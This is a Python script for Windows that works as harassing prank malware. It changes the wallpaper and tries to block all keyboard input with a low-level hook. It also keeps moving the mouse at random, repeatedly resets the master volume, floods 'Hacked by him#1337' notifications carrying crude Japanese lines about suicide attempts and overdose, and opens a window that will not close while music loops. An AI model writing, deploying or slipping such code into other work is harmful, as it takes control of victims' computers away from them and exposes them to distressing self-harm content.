import resource
import ctypes
import pygame
import threading
import random
from ctypes import cast, POINTER ,wintypes
import win32api
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from win10toast import ToastNotifier
import sys ,os

ctypes.windll.user32.SystemParametersInfoW(20, 0, resource.folder+'desktop.png' ,3)

class Threadlib:
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100
    HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    text = ["暇つぶした自殺未遂 嘔吐した真昼間のオーバードーズ",
            "おなかもよう晴れのち雨 落ち着かない真夜中の精神統一",
            "うんこが け陰毛 パスタ 胎児のドブ漬けゲロ風味",
            "布団潜ればまっくらのやみ 月曜日のメンタル逆エベレスト"]
    @staticmethod
    def setMouse():
        while True:
            win32api.SetCursorPos((random.randint(0,900),random.randint(0,900)))
            
    @staticmethod
    def keepkeyboard():
        hook = Threadlib.HOOKPROC(Threadlib.hook_callback)
        user32 = ctypes.windll.user32
        hook_id = user32.SetWindowsHookExW(Threadlib.WH_KEYBOARD_LL, hook, None, 0)


        msg = wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))

        user32.UnhookWindowsHookEx(hook_id)

    @staticmethod
    def setwave():
        while True:
            Threadlib.volume.SetMasterVolumeLevel(0, None)
    @staticmethod
    def sendmessage():  
        toaster = ToastNotifier()
        icon_path = Threadlib.resource_path(resource.folder+'ybj.ico')

        if not os.path.exists(icon_path):
            raise FileNotFoundError(f"图标文件未找到: {icon_path}")
        try:
            while True:
                
                toaster.show_toast(
                    title="Hacked by him#1337",msg=random.choice(Threadlib.text),
                    icon_path=icon_path,  duration=5)
        except:
            pass
        
    @classmethod
    def hook_callback(nCode, wParam, lParam):
        if wParam == Threadlib.WM_KEYDOWN:
            
            return 1  
        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
    @classmethod
    def resource_path(cls,relative_path):
        
        try:
            
            base_path = sys._MEIPASS
        except AttributeError:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)
    
def show():
    pygame.init()
    pygame.display.set_caption("yebuji")
    screen = pygame.display.set_mode([621, 500])
    screen.fill([255, 255, 205])
    img = pygame.image.load(resource.folder+'yebuji.bmp')
    screen.blit(img, [0, 0])
    pygame.display.flip()
    pygame.mixer.init()
    pygame.mixer.music.load(resource.folder+'music.mp3')
    pygame.mixer.music.play(-1)
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pass


def threads_item():
    th=[]
    for name ,items in Threadlib.__dict__.items():
        if isinstance(items ,staticmethod):
           
            exec("th.append("+"Threadlib."+name+")")
    return th


th = threads_item() #[Threadlib.keepkeyboard ,Threadlib.setMouse,Threadlib.setwave]
if __name__ == "__main__":
    for t in th:
        threading.Thread(target=t).start()

    show()